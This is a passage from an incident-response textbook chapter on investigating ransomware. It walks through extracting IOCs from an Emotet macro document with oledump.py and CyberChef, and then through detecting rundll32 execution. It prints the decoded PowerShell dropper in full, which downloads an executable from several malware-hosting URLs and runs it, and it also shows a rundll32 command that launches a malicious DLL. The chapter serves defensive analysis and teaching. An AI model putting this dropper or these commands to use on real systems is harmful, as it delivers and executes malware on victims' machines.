<html><head></head><body>
<div id="_idContainer326">
<h1 class="chapter-number" id="_idParaDest-259"><a id="_idTextAnchor266"/><span class="koboSpan" id="kobo.1.1">15</span></h1>
<h1 id="_idParaDest-260"><a id="_idTextAnchor267"/><span class="koboSpan" id="kobo.2.1">Ransomware Investigations</span></h1>
<p><span class="koboSpan" id="kobo.3.1">Spend even the shortest amount of time in incident response and you will most likely respond to a ransomware investigation. </span><span class="koboSpan" id="kobo.3.2">As we saw in the previous chapter, the threat from such attacks is widespread, impacting organizations of every size. </span><span class="koboSpan" id="kobo.3.3">These include government entities, large corporations, healthcare, and critical infrastructure. </span><span class="koboSpan" id="kobo.3.4">Given the nature of ransomware attacks, analysts and responders should be familiar with how to investigate the common tactics and techniques </span><span class="No-Break"><span class="koboSpan" id="kobo.4.1">of ransomware.</span></span></p>
<p><span class="koboSpan" id="kobo.5.1">In this chapter, we will look at a few of the more common tactics and associated evidence. </span><span class="koboSpan" id="kobo.5.2">Specifically, we will examine </span><span class="No-Break"><span class="koboSpan" id="kobo.6.1">the following:</span></span></p>
<ul>
<li><span class="koboSpan" id="kobo.7.1">Ransomware initial access </span><span class="No-Break"><span class="koboSpan" id="kobo.8.1">and execution</span></span></li>
<li><span class="koboSpan" id="kobo.9.1">Discovering credential access </span><span class="No-Break"><span class="koboSpan" id="kobo.10.1">and theft</span></span></li>
<li><span class="koboSpan" id="kobo.11.1">Investigating </span><span class="No-Break"><span class="koboSpan" id="kobo.12.1">post-exploitation frameworks</span></span></li>
<li><span class="koboSpan" id="kobo.13.1">Command </span><span class="No-Break"><span class="koboSpan" id="kobo.14.1">and Control</span></span></li>
<li><span class="koboSpan" id="kobo.15.1">Investigating lateral </span><span class="No-Break"><span class="koboSpan" id="kobo.16.1">movement techniques</span></span></li>
</ul>
<h1 id="_idParaDest-261"><a id="_idTextAnchor268"/><span class="koboSpan" id="kobo.17.1">Ransomware initial access and execution</span></h1>
<p><span class="koboSpan" id="kobo.18.1">The first stage of ransomware attacks is initially accessing the target environment and executing the first stage of malware. </span><span class="koboSpan" id="kobo.18.2">This provides the initial foothold that threat actors need to carry out the remainder of the attack. </span><span class="koboSpan" id="kobo.18.3">Having an awareness of how this initial foothold is achieved allows analysts to extract the IOCs related to this stage of the attack with the intent of determining the scope and potential source of </span><span class="No-Break"><span class="koboSpan" id="kobo.19.1">the attack.</span></span></p>
<h2 id="_idParaDest-262"><a id="_idTextAnchor269"/><span class="koboSpan" id="kobo.20.1">Initial access</span></h2>
<p><span class="koboSpan" id="kobo.21.1">The primary</span><a id="_idIndexMarker1281"/><span class="koboSpan" id="kobo.22.1"> method that ransomware threat actors utilize to get the initial foothold into the target environment is using a </span><strong class="bold"><span class="koboSpan" id="kobo.23.1">Spear Phishing Attachment attack [T1566.001]</span></strong><span class="koboSpan" id="kobo.24.1">. </span><span class="koboSpan" id="kobo.24.2">In many cases, this involves the use of a Microsoft </span><a id="_idIndexMarker1282"/><span class="koboSpan" id="kobo.25.1">Word or Excel spreadsheet that has a macro that can execute a </span><strong class="bold"><span class="koboSpan" id="kobo.26.1">Virtual Basic Application</span></strong><span class="koboSpan" id="kobo.27.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.28.1">VBA</span></strong><span class="koboSpan" id="kobo.29.1">). </span><span class="koboSpan" id="kobo.29.2">This macro is often </span><a id="_idIndexMarker1283"/><span class="koboSpan" id="kobo.30.1">the first stage in a multi-stage attack where the unsuspecting user executes the macro, which then reaches out to the adversary’s infrastructure to pull down additional malware such as RAT or tools associated with a post-exploitation framework such as </span><span class="No-Break"><span class="koboSpan" id="kobo.31.1">Cobalt Strike.</span></span></p>
<p><span class="koboSpan" id="kobo.32.1">In this case, we are going to look at a macro that executes from a Microsoft Word document and calls down an instance of Emotet. </span><span class="koboSpan" id="kobo.32.2">A sample of the document can be found at </span><a href="https://app.any.run/tasks/c9ba8b96-5f45-4cb5-8b3d-8dc16910b930/#"><span class="koboSpan" id="kobo.33.1">https://app.any.run/tasks/c9ba8b96-5f45-4cb5-8b3d-8dc16910b930/#</span></a><span class="koboSpan" id="kobo.34.1">. </span><span class="koboSpan" id="kobo.34.2">As with any potentially malicious code, the following process was executed in a properly configured </span><span class="No-Break"><span class="koboSpan" id="kobo.35.1">malware sandbox.</span></span></p>
<p><span class="koboSpan" id="kobo.36.1">Before we begin this process, it is important to see what the target user or users would see. </span><span class="koboSpan" id="kobo.36.2">In this case, if </span><a id="_idIndexMarker1284"/><span class="koboSpan" id="kobo.37.1">they were to click on the Word attachment in an email, the following </span><span class="No-Break"><span class="koboSpan" id="kobo.38.1">would appear:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer289">
<span class="koboSpan" id="kobo.39.1"><img alt="Figure 15.1 – Microsoft Word document – Enable Content " src="image/B18571_15_001.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.40.1">Figure 15.1 – Microsoft Word document – Enable Content</span></p>
<p><span class="koboSpan" id="kobo.41.1">By clicking the </span><strong class="bold"><span class="koboSpan" id="kobo.42.1">Enable Content</span></strong><span class="koboSpan" id="kobo.43.1"> button, the macro can run. </span><span class="koboSpan" id="kobo.43.2">Let’s go ahead and look at the internal workings of the macro and see what IOCs can be extracted from the code. </span><span class="koboSpan" id="kobo.43.3">In this instance, we will examine the suspect file with </span><strong class="source-inline"><span class="koboSpan" id="kobo.44.1">OleDump.py</span></strong><span class="koboSpan" id="kobo.45.1">. </span><span class="koboSpan" id="kobo.45.2">This tool, developed by Didier Stevens, can be used to</span><a id="_idIndexMarker1285"/><span class="koboSpan" id="kobo.46.1"> analyze </span><strong class="bold"><span class="koboSpan" id="kobo.47.1">Object Linking and Embedding</span></strong><span class="koboSpan" id="kobo.48.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.49.1">OLE</span></strong><span class="koboSpan" id="kobo.50.1">) or compound documents. </span><span class="koboSpan" id="kobo.50.2">The tool is available at </span><a href="https://blog.didierstevens.com/programs/oledump-py/"><span class="koboSpan" id="kobo.51.1">https://blog.didierstevens.com/programs/oledump-py/</span></a><span class="koboSpan" id="kobo.52.1">. </span><span class="koboSpan" id="kobo.52.2">There is also a handy cheat sheet to go along with the tool </span><span class="No-Break"><span class="koboSpan" id="kobo.53.1">at </span></span><a href="https://sansorg.egnyte.com/dl/3ydBhha67l"><span class="No-Break"><span class="koboSpan" id="kobo.54.1">https://sansorg.egnyte.com/dl/3ydBhha67l</span></span></a><span class="No-Break"><span class="koboSpan" id="kobo.55.1">.</span></span></p>
<p class="callout-heading"><span class="koboSpan" id="kobo.56.1">OLE background</span></p>
<p class="callout"><span class="koboSpan" id="kobo.57.1">OLE is a feature of Microsoft documents for containing additional data types or components. </span><span class="koboSpan" id="kobo.57.2">This provides additional features for users but also creates a tool that can be leveraged by threat actors. </span><span class="koboSpan" id="kobo.57.3">Microsoft provides an overview of OLE at </span><a href="https://docs.microsoft.com/en-us/cpp/mfc/ole-background?view=msvc-170"><span class="koboSpan" id="kobo.58.1">https://docs.microsoft.com/en-us/cpp/mfc/ole-background?view=msvc-170</span></a><span class="koboSpan" id="kobo.59.1"> that is worth </span><span class="No-Break"><span class="koboSpan" id="kobo.60.1">a review.</span></span></p>
<p><span class="koboSpan" id="kobo.61.1">First, point </span><strong class="source-inline"><span class="koboSpan" id="kobo.62.1">Oledump.py</span></strong><span class="koboSpan" id="kobo.63.1"> to the suspect file, which can be downloaded with the </span><span class="No-Break"><span class="koboSpan" id="kobo.64.1">following command:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.65.1">
C:\Users\PROD-SANDBOX\Downloads\Oledump&gt;oledump.py DETAILS-RL1609.doc</span></pre>
<p><span class="koboSpan" id="kobo.66.1">This produces </span><a id="_idIndexMarker1286"/><span class="koboSpan" id="kobo.67.1">the </span><span class="No-Break"><span class="koboSpan" id="kobo.68.1">following output:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer290">
<span class="koboSpan" id="kobo.69.1"><img alt="Figure 15.2 – Oledump.py output " src="image/B18571_15_002.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.70.1">Figure 15.2 – Oledump.py output</span></p>
<p><span class="koboSpan" id="kobo.71.1">In the </span><strong class="source-inline"><span class="koboSpan" id="kobo.72.1">Oledump.py</span></strong><span class="koboSpan" id="kobo.73.1"> output, three</span><a id="_idIndexMarker1287"/><span class="koboSpan" id="kobo.74.1"> lines indicate the presence of a macro. </span><span class="koboSpan" id="kobo.74.2">Line 16 has a lowercase </span><strong class="source-inline"><span class="koboSpan" id="kobo.75.1">m</span></strong><span class="koboSpan" id="kobo.76.1">, indicating that a macro module is defined but there is no code associated with that line. </span><span class="koboSpan" id="kobo.76.2">The two remaining lines with the uppercase </span><strong class="source-inline"><span class="koboSpan" id="kobo.77.1">M</span></strong><span class="koboSpan" id="kobo.78.1"> indicate the presence of macro code. </span><span class="koboSpan" id="kobo.78.2">In this case, we can dump that macro code to an output that can be analyzed with a tool</span><a id="_idIndexMarker1288"/><span class="koboSpan" id="kobo.79.1"> such as </span><strong class="bold"><span class="koboSpan" id="kobo.80.1">Visual Studio Code</span></strong><span class="koboSpan" id="kobo.81.1"> with the following </span><strong class="source-inline"><span class="koboSpan" id="kobo.82.1">Oledump.py</span></strong><span class="koboSpan" id="kobo.83.1"> commands. </span><span class="koboSpan" id="kobo.83.2">To extract the VBA code from line 17, the following command can </span><span class="No-Break"><span class="koboSpan" id="kobo.84.1">be used:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.85.1">
C:\Users\PROD-SANDBOX\Downloads\Oledump&gt;oledump.py -s 17 -v DETAILS-RL1609.doc &gt; macro17</span></pre>
<p><span class="koboSpan" id="kobo.86.1">The </span><strong class="source-inline"><span class="koboSpan" id="kobo.87.1">-s</span></strong><span class="koboSpan" id="kobo.88.1"> argument indicates that Oledump should dump the strings from line 17. </span><span class="koboSpan" id="kobo.88.2">The VBA code will be compressed. </span><span class="koboSpan" id="kobo.88.3">The </span><strong class="source-inline"><span class="koboSpan" id="kobo.89.1">-v</span></strong><span class="koboSpan" id="kobo.90.1"> argument decompresses the output. </span><span class="koboSpan" id="kobo.90.2">This process should be </span><a id="_idIndexMarker1289"/><span class="koboSpan" id="kobo.91.1">repeated with the same command for </span><span class="No-Break"><span class="koboSpan" id="kobo.92.1">line 18:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.93.1">
C:\Users\PROD-SANDBOX\Downloads\Oledump&gt;oledump.py -s 18 -v DETAILS-RL1609.doc &gt; macro18</span></pre>
<p><span class="koboSpan" id="kobo.94.1">From here, we will analyze the output from line 18 first. </span><span class="koboSpan" id="kobo.94.2">Line 9, in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.95.1">Figure 17</span></em></span><em class="italic"><span class="koboSpan" id="kobo.96.1">.3</span></em><span class="koboSpan" id="kobo.97.1">, shows what triggers the action of the macro – in this case, it is when the document is opened. </span><span class="koboSpan" id="kobo.97.2">Line 10 shows the entry point with the </span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.98.1">Tbcepkcgnhpwx</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.99.1"> method:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer291">
<span class="koboSpan" id="kobo.100.1"><img alt="Figure 15.3 – Oledump.py macro identification " src="image/B18571_15_003.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.101.1">Figure 15.3 – Oledump.py macro identification</span></p>
<p><span class="koboSpan" id="kobo.102.1">Opening the output</span><a id="_idIndexMarker1290"/><span class="koboSpan" id="kobo.103.1"> from macro17, we can see a significant amount of code. </span><span class="koboSpan" id="kobo.103.2">Using the entry point that was found in macro18, we can use the </span><strong class="bold"><span class="koboSpan" id="kobo.104.1">Find</span></strong><span class="koboSpan" id="kobo.105.1"> tool and locate the entry point. </span><span class="koboSpan" id="kobo.105.2">A simple </span><strong class="bold"><span class="koboSpan" id="kobo.106.1">Find</span></strong><span class="koboSpan" id="kobo.107.1"> using the </span><strong class="source-inline"><span class="koboSpan" id="kobo.108.1">Tbcepkcgnhpwx()</span></strong><span class="koboSpan" id="kobo.109.1"> function reveals several instances of those characters on line 79, as </span><span class="No-Break"><span class="koboSpan" id="kobo.110.1">shown here:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer292">
<span class="koboSpan" id="kobo.111.1"><img alt="Figure 15.4 – Macro obfuscation " src="image/B18571_15_004.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.112.1">Figure 15.4 – Macro obfuscation</span></p>
<p><span class="koboSpan" id="kobo.113.1">What follows on</span><a id="_idIndexMarker1291"/><span class="koboSpan" id="kobo.114.1"> line 80 of macro17 appears to be obfuscated code. </span><span class="koboSpan" id="kobo.114.2">This is typical for malicious scripts as it is a way to bypass detective controls. </span><span class="koboSpan" id="kobo.114.3">This obfuscated code presents the next set of characters that can be leveraged. </span><span class="koboSpan" id="kobo.114.4">In this case, the series of </span><strong class="source-inline"><span class="koboSpan" id="kobo.115.1">//====dsfnnJJJsm388//=</span></strong><span class="koboSpan" id="kobo.116.1"> characters appears to be a token used to obfuscate the code. </span><span class="koboSpan" id="kobo.116.2">That token can be used to obfuscate some of the script. </span><span class="koboSpan" id="kobo.116.3">Take the character set and use the </span><strong class="bold"><span class="koboSpan" id="kobo.117.1">Find</span></strong><span class="koboSpan" id="kobo.118.1"> tool to locate all instances. </span><span class="koboSpan" id="kobo.118.2">Then, replace them with nothing; the following</span><a id="_idIndexMarker1292"/><span class="koboSpan" id="kobo.119.1"> will appear on </span><span class="No-Break"><span class="koboSpan" id="kobo.120.1">line 80:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer293">
<span class="koboSpan" id="kobo.121.1"><img alt="Figure 15.5 – Macro code plaintext " src="image/B18571_15_005.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.122.1">Figure 15.5 – Macro code plaintext</span></p>
<p><span class="koboSpan" id="kobo.123.1">At this point, we</span><a id="_idIndexMarker1293"/><span class="koboSpan" id="kobo.124.1"> have an unobstructed view of the VBA script and can begin the process of static analysis. </span><span class="koboSpan" id="kobo.124.2">The drawback is that we still do not have any specific IOCs to leverage. </span><span class="koboSpan" id="kobo.124.3">At this stage, we need to return to the beginning and identify any specific lines in the </span><strong class="source-inline"><span class="koboSpan" id="kobo.125.1">OleDump.py</span></strong><span class="koboSpan" id="kobo.126.1"> results in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.127.1">Figure 17</span></em></span><em class="italic"><span class="koboSpan" id="kobo.128.1">.2</span></em><span class="koboSpan" id="kobo.129.1">. </span><span class="koboSpan" id="kobo.129.2">In this case, line 14 shows a lot more data. </span><span class="koboSpan" id="kobo.129.3">Using </span><strong class="source-inline"><span class="koboSpan" id="kobo.130.1">Oledump.py</span></strong><span class="koboSpan" id="kobo.131.1"> again, we want to dump the contents of that line out with the </span><span class="No-Break"><span class="koboSpan" id="kobo.132.1">following command:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.133.1">
C:\Users\PROD-SANDBOX\Downloads\Oledump&gt;oledump.py -s 14 -d DETAILS-RL1609.doc &gt; macro14</span></pre>
<p><span class="koboSpan" id="kobo.134.1">In the preceding command, we do not have to worry about compression but do want to use the </span><strong class="source-inline"><span class="koboSpan" id="kobo.135.1">-d</span></strong><span class="koboSpan" id="kobo.136.1"> argument so that the entire contents of the line are outputted to macro14. </span><span class="koboSpan" id="kobo.136.2">This file can be opened either with Visual Studio Code or a simple text editor such as Notepad++, as shown in the </span><span class="No-Break"><span class="koboSpan" id="kobo.137.1">following screenshot:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer294">
<span class="koboSpan" id="kobo.138.1"><img alt="Figure 15.6 – Macro file text output " src="image/B18571_15_006.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.139.1">Figure 15.6 – Macro file text output</span></p>
<p><span class="koboSpan" id="kobo.140.1">In the</span><a id="_idIndexMarker1294"/><span class="koboSpan" id="kobo.141.1"> previous </span><a id="_idIndexMarker1295"/><span class="koboSpan" id="kobo.142.1">screenshot, we can see the same token, </span><strong class="source-inline"><span class="koboSpan" id="kobo.143.1">//====dsfnnJJJsm388//=</span></strong><span class="koboSpan" id="kobo.144.1">, that was previously identified, along with other code. </span><span class="koboSpan" id="kobo.144.2">Further down in the output, we can see the </span><span class="No-Break"><span class="koboSpan" id="kobo.145.1">same pattern:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer295">
<span class="koboSpan" id="kobo.146.1"><img alt="Figure 15.7 – Macro obfuscated code " src="image/B18571_15_007.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.147.1">Figure 15.7 – Macro obfuscated code</span></p>
<p><span class="koboSpan" id="kobo.148.1">From here, we </span><a id="_idIndexMarker1296"/><span class="koboSpan" id="kobo.149.1">can</span><a id="_idIndexMarker1297"/><span class="koboSpan" id="kobo.150.1"> repeat a similar process and remove the token characters with the </span><strong class="bold"><span class="koboSpan" id="kobo.151.1">Find</span></strong><span class="koboSpan" id="kobo.152.1"> tool and replace them with nothing. </span><span class="koboSpan" id="kobo.152.2">What we are left with is data encoded with Base64, as </span><span class="No-Break"><span class="koboSpan" id="kobo.153.1">shown here:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer296">
<span class="koboSpan" id="kobo.154.1"><img alt="Figure 15.8 – Base64-encoded command " src="image/B18571_15_008.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.155.1">Figure 15.8 – Base64-encoded command</span></p>
<p><span class="koboSpan" id="kobo.156.1">To extract the IOCs </span><a id="_idIndexMarker1298"/><span class="koboSpan" id="kobo.157.1">related to the macro, we can copy the</span><a id="_idIndexMarker1299"/><span class="koboSpan" id="kobo.158.1"> Base64 characters and decode them using any tool that will decode Base64. </span><span class="koboSpan" id="kobo.158.2">In this case, we will use the open source</span><a id="_idIndexMarker1300"/><span class="koboSpan" id="kobo.159.1"> tool </span><strong class="bold"><span class="koboSpan" id="kobo.160.1">CyberChef</span></strong><span class="koboSpan" id="kobo.161.1">. </span><span class="koboSpan" id="kobo.161.2">This tool, created by the United Kingdom’s GHCQ, allows analysts to carve up and manipulate data using “recipes” or a series of commands. </span><span class="koboSpan" id="kobo.161.3">CyberChef can be accessed via the web at </span><a href="https://gchq.github.io/CyberChef/"><span class="koboSpan" id="kobo.162.1">https://gchq.github.io/CyberChef/</span></a><span class="koboSpan" id="kobo.163.1"> or downloaded to a local machine. </span><span class="koboSpan" id="kobo.163.2">This is often a good option if you are using an air-gapped sandbox. </span><span class="koboSpan" id="kobo.163.3">The tool consists of four major sections, as shown in the </span><span class="No-Break"><span class="koboSpan" id="kobo.164.1">following screenshot:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer297">
<span class="koboSpan" id="kobo.165.1"><img alt="Figure 15.9 – CyberChef interface " src="image/B18571_15_009.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.166.1">Figure 15.9 – CyberChef interface</span></p>
<p><span class="koboSpan" id="kobo.167.1">The first of</span><a id="_idIndexMarker1301"/><span class="koboSpan" id="kobo.168.1"> these sections is </span><strong class="bold"><span class="koboSpan" id="kobo.169.1">Operations</span></strong><span class="koboSpan" id="kobo.170.1">. </span><span class="koboSpan" id="kobo.170.2">These are the specific </span><a id="_idIndexMarker1302"/><span class="koboSpan" id="kobo.171.1">commands that can be run. </span><span class="koboSpan" id="kobo.171.2">The operations are dragged into the </span><strong class="bold"><span class="koboSpan" id="kobo.172.1">Recipe</span></strong><span class="koboSpan" id="kobo.173.1"> section and run against the input. </span><span class="koboSpan" id="kobo.173.2">Clicking the </span><strong class="bold"><span class="koboSpan" id="kobo.174.1">BAKE!</span></strong><span class="koboSpan" id="kobo.175.1"> button runs the recipe. </span><span class="koboSpan" id="kobo.175.2">CyberChef also allows the analyst to save a recipe or use community-sourced recipes such as those found on GitHub </span><span class="No-Break"><span class="koboSpan" id="kobo.176.1">at </span></span><a href="https://github.com/mattnotmax/cyberchef-recipes"><span class="No-Break"><span class="koboSpan" id="kobo.177.1">https://github.com/mattnotmax/cyberchef-recipes</span></span></a><span class="No-Break"><span class="koboSpan" id="kobo.178.1">.</span></span></p>
<p><span class="koboSpan" id="kobo.179.1">In this case, we will use two operations to decode the encoded text and extract the IOCs. </span><span class="koboSpan" id="kobo.179.2">In this case, we will use the </span><strong class="bold"><span class="koboSpan" id="kobo.180.1">From Base64</span></strong><span class="koboSpan" id="kobo.181.1"> and </span><strong class="bold"><span class="koboSpan" id="kobo.182.1">Decode text</span></strong><span class="koboSpan" id="kobo.183.1"> operations. </span><span class="koboSpan" id="kobo.183.2">Simply click on the specific operation and drag it into the </span><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.184.1">Recipe</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.185.1"> section:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer298">
<span class="koboSpan" id="kobo.186.1"><img alt="Figure 15.10 – CyberChef – Recipe " src="image/B18571_15_010.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.187.1">Figure 15.10 – CyberChef – Recipe</span></p>
<p><span class="koboSpan" id="kobo.188.1">Once the recipe</span><a id="_idIndexMarker1303"/><span class="koboSpan" id="kobo.189.1"> has been set, hit </span><strong class="bold"><span class="koboSpan" id="kobo.190.1">BAKE!</span></strong><span class="koboSpan" id="kobo.191.1">; the following results </span><span class="No-Break"><span class="koboSpan" id="kobo.192.1">should appear:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer299">
<span class="koboSpan" id="kobo.193.1"><img alt="Figure 15.11 – CyberChef decoding " src="image/B18571_15_011.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.194.1">Figure 15.11 – CyberChef decoding</span></p>
<p><span class="koboSpan" id="kobo.195.1">The output </span><a id="_idIndexMarker1304"/><span class="koboSpan" id="kobo.196.1">appears to be a combination of commands </span><span class="No-Break"><span class="koboSpan" id="kobo.197.1">and URLs:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.198.1">
$Kqldfmbvr='Xidvorbkkcgta';$Fymbhyexmh = '593';$Nnrgqikkfqy='Bjspcpsecqf';$Osxjsuvbbxzc=$env:userprofile
+'\'+$Fymbhyexmh+'.exe';$Qeewlohvnhzjg='Tqytjxitodxzf';$Pvqkrn
oao=&amp;('new-ob'+'jec'+'t') nET.WebcLIEnt;$Fkmngitga='http://oni
ongames.jp/contact/iY/*http://pmthome.com/posta/dr3zxa/*http:
//urgeventa.es/img/k35d9q/*https://solmec.com.ar/sitio/nTXZomKCx/*https://tiagocambara.com/cgi-bin/s96/'."SpL`IT"
('*');$Xmvtsffjfj='Nbsfvavkmslb';foreach($Qtykmgpyyczy in $Fkmngitga){try{$Pvqkrnoao."d`OWnloa`DfIlE"($Qtykmgpyyczy, $Osxjsuvbbxzc);$Lqsnocick='Mwrnhskzeus';If ((&amp;('Ge'+'t'+'-Item') $Osxjsuvbbxzc)."l`eNg`Th" -ge 36952) {[Diagnostics.rocess]::"S`TARt"($Osxjsuvbbxzc);$Zjcyebtu='Pqrvhklqerie';
break;$Fzbbuntuulpsg='Musmxxqbo'}}catch{}}$Jbrhtvgftfzs=
'Bvvggpdikswqr'</span></pre>
<p><span class="koboSpan" id="kobo.199.1">From here, we extract several URLs. </span><span class="koboSpan" id="kobo.199.2">For example, the URL </span><a href="http://pmthome.com"><span class="koboSpan" id="kobo.200.1">http://pmthome.com</span></a><span class="koboSpan" id="kobo.201.1"> has been identified as hosting malware, as indicated by the following screenshot </span><span class="No-Break"><span class="koboSpan" id="kobo.202.1">from VirusTotal:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer300">
<span class="koboSpan" id="kobo.203.1"><img alt="Figure 15.12 – VirusTotal analysis " src="image/B18571_15_012.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.204.1">Figure 15.12 – VirusTotal analysis</span></p>
<p><span class="koboSpan" id="kobo.205.1">A macro-enabled </span><a id="_idIndexMarker1305"/><span class="koboSpan" id="kobo.206.1">document is usually the first step in a chain of events where the victim user executes </span><a id="_idIndexMarker1306"/><span class="koboSpan" id="kobo.207.1">the macro which, in turn, executes a script that reaches out to one of the URLs and downloads a secondary payload for execution. </span><span class="koboSpan" id="kobo.207.2">This secondary payload is often a repurposed banking Trojan that is used to gain some remote access so that additional tools can be placed on </span><span class="No-Break"><span class="koboSpan" id="kobo.208.1">the system.</span></span></p>
<h2 id="_idParaDest-263"><a id="_idTextAnchor270"/><span class="koboSpan" id="kobo.209.1">Execution</span></h2>
<p><span class="koboSpan" id="kobo.210.1">Following up with</span><a id="_idIndexMarker1307"/><span class="koboSpan" id="kobo.211.1"> the previous discussion regarding the initial access, we will now look at how threat actors execute the payloads that are loaded via the scripts we previously examined. </span><span class="koboSpan" id="kobo.211.2">There are several ways that malware is executed. </span><span class="koboSpan" id="kobo.211.3">A cursory examination of the execution tactic within the MITRE ATT&amp;CK framework demonstrates this. </span><span class="koboSpan" id="kobo.211.4">With that, the old saying holds; </span><em class="italic"><span class="koboSpan" id="kobo.212.1">“malware can hide but it has to run.”</span></em><span class="koboSpan" id="kobo.213.1"> Considering this sentiment, we will look at leveraging Velociraptor and some of the evidence sources to find the execution of </span><span class="No-Break"><span class="koboSpan" id="kobo.214.1">malicious code.</span></span></p>
<p><span class="koboSpan" id="kobo.215.1">First, we will look at the execution technique </span><strong class="bold"><span class="koboSpan" id="kobo.216.1">System Binary Proxy Execution: Rundll32 [T1218.011]</span></strong><span class="koboSpan" id="kobo.217.1">. </span><span class="koboSpan" id="kobo.217.2">In this technique, the threat actor uses the legitimate Microsoft Windows binary to execute a malicious action. </span><span class="koboSpan" id="kobo.217.3">Threat actors use Rundll32 for several reasons. </span><span class="koboSpan" id="kobo.217.4">This can be to bypass access controls, abuse legitimate system DLL files for malicious purposes, or move legitimate DLL files as part of an overall attack. </span><span class="koboSpan" id="kobo.217.5">In this example, we will examine how a threat actor can use Rundll32 to execute its own malicious </span><span class="No-Break"><span class="koboSpan" id="kobo.218.1">DLL file.</span></span></p>
<p><span class="koboSpan" id="kobo.219.1">From the previous section, we saw how a threat actor can use a VBA script embedded in a Microsoft Word document that, when executed, reaches out to an external server and downloads a file. </span><span class="koboSpan" id="kobo.219.2">In this case, we will start with the same process, where we downloaded an Emotet binary in the form of a DLL file. </span><span class="koboSpan" id="kobo.219.3">(The live Emotet binary can be found </span><span class="No-Break"><span class="koboSpan" id="kobo.220.1">at </span></span><a href="https://bazaar.abuse.ch/browse.php?search=sha256%3Acd13a9a774197bf84bd25a30f4cd51dbc4908138e2e008c81fc1feef881c6da7"><span class="No-Break"><span class="koboSpan" id="kobo.221.1">https://bazaar.abuse.ch/browse.php?search=sha256%3Acd13a9a774197bf84bd25a30f4cd51dbc4908138e2e008c</span></span>
<span class="No-Break"><span class="koboSpan" id="kobo.222.1">81fc1feef881c6da7</span></span></a><span class="No-Break"><span class="koboSpan" id="kobo.223.1">.)</span></span></p>
<p><span class="koboSpan" id="kobo.224.1">One location where malicious DLL files can be found is in the logged-on user’s AppData directory. </span><span class="koboSpan" id="kobo.224.2">This is </span><a id="_idIndexMarker1308"/><span class="koboSpan" id="kobo.225.1">often due to the file being downloaded via the macro. </span><span class="koboSpan" id="kobo.225.2">In this case, we will execute the Emotet binary from that location on the victim’s system. </span><span class="koboSpan" id="kobo.225.3">Threat actors can conduct this remotely by simply using the </span><span class="No-Break"><span class="koboSpan" id="kobo.226.1">following command:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.227.1">
C:\Windows\system32&gt;rundll32.exe C:\Users\PROD-SANDBOX\AppData
\Local\Temp\sample.dll,#1</span></pre>
<p><span class="koboSpan" id="kobo.228.1">In the previous command, the </span><strong class="source-inline"><span class="koboSpan" id="kobo.229.1">sample.dll</span></strong><span class="koboSpan" id="kobo.230.1"> file is executed via Rundll32 with ordinal </span><strong class="source-inline"><span class="koboSpan" id="kobo.231.1">#1</span></strong><span class="koboSpan" id="kobo.232.1">. </span><span class="koboSpan" id="kobo.232.2">From here, the DLL file executes, and the </span><span class="No-Break"><span class="koboSpan" id="kobo.233.1">malware runs.</span></span></p>
<p><span class="koboSpan" id="kobo.234.1">Going back to the quote “</span><em class="italic"><span class="koboSpan" id="kobo.235.1">malware can hide but it has to run</span></em><span class="koboSpan" id="kobo.236.1">,” there are several locations where evidence of the execution can be found. </span><span class="koboSpan" id="kobo.236.2">In this case, we will look at using Velociraptor and the </span><strong class="bold"><span class="koboSpan" id="kobo.237.1">Windows.Analysis.EvidenceOfExecution</span></strong><span class="koboSpan" id="kobo.238.1"> evidence collection. </span><span class="koboSpan" id="kobo.238.2">In Velociraptor, click on the plus (</span><strong class="bold"><span class="koboSpan" id="kobo.239.1">+</span></strong><span class="koboSpan" id="kobo.240.1">) </span><span class="No-Break"><span class="koboSpan" id="kobo.241.1">icon:</span></span></p>
<div>
